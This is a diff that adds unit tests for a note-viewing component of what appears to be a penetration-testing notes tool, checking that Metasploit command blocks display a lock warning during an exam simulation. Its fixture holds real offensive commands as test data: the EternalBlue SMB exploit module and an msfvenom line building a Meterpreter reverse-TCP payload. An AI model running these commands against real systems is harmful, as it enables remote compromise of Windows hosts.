@@ -289,6 +289,62 @@ describe("NoteView commands", () => {
   });
 });
 
+describe("NoteView Metasploit lock", () => {
+  const H2: Host = { ...H1, id: "h2", name: "zzws02.example.test", ip: "198.51.100.22" };
+  const MSF = parseNote("03-Tools/Zz Msf.md", [
+    "# Zz Msf",
+    "## Module",
+    "```",
+    "use exploit/windows/smb/ms17_010_eternalblue",
+    "```",
+    "## Handler",
+    "```",
+    "use exploit/multi/handler",
+    "```",
+    "## Stager",
+    "```",
+    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} -f exe",
+    "```",
+  ].join("\n"))!;
+  const LOCKED = "Metasploit is locked to zzws02";
+  const MODULE = "Module: use exploit/windows/smb/ms17_010_eternalblue";
+  const ruleIn = async (name: string) => (await cmdGroup(name)).querySelector(".manual-command__rule");
+
+  beforeEach(() => {
+    m.hostsList.mockResolvedValue([H1, H2]);
+  });
+
+  it("in an exam sim locked to another host, a module block shows the lock line and its first copy is held", async () => {
+    m.engagementGet.mockResolvedValue({ ...E1, kind: "exam-sim", msfHostId: "h2" });
+    const user = userEvent.setup();
+    mount(MSF);
+    await waitFor(async () => expect(await ruleIn(MODULE)).toHaveTextContent(LOCKED));
+    expect(await ruleIn(MODULE)).toHaveClass("manual-command__rule--warn");
+    await navigator.clipboard.writeText("untouched");
+    const copy = screen.getByRole("button", { name: `Copy command: ${MODULE}` });
+    await user.click(copy);
+    await waitFor(() => expect(useManualStatus.getState().text).toBe(`${LOCKED}. Press ↵ again to copy anyway`));
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    await user.click(copy);
+    await waitFor(async () => expect(await navigator.clipboard.readText()).toBe("use exploit/windows/smb/ms17_010_eternalblue"));
+  });
+
+  it("in an exam sim a multi/handler block gets no lock line, and a Meterpreter block still does", async () => {
+    m.engagementGet.mockResolvedValue({ ...E1, kind: "exam-sim", msfHostId: "h2" });
+    mount(MSF);
+    await waitFor(async () =>
+      expect(await ruleIn("Stager: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} -f exe")).toHaveTextContent(LOCKED));
+    expect(await ruleIn("Handler: use exploit/multi/handler")).toBeNull();
+  });
+
+  it("outside an exam sim no Metasploit block gets a lock line", async () => {
+    m.engagementGet.mockResolvedValue({ ...E1, msfHostId: "h2" });
+    mount(MSF);
+    await screen.findByText((_, el) => el?.tagName === "PRE" && el.textContent === "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.9 -f exe");
+    expect(document.querySelector(".manual-command__rule")).toBeNull();
+  });
+});
+
 describe("NoteView output blocks", () => {
   it("a text fence is output: no fill, no exam line, copies at once and ⌘↵ never logs", async () => {
     m.engagementGet.mockResolvedValue({ ...E1, kind: "exam-sim" });
